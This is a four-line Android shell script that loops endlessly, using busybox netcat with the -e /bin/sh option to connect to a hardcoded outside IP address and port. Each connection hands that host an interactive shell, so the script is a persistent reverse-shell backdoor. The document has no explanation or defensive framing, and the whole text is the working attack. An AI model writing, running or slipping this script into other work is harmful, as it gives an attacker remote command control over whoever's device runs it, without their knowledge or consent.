#!/system/bin/sh
while true
do
  busybox nc 3.141.142.211 11397 -e /bin/sh
done


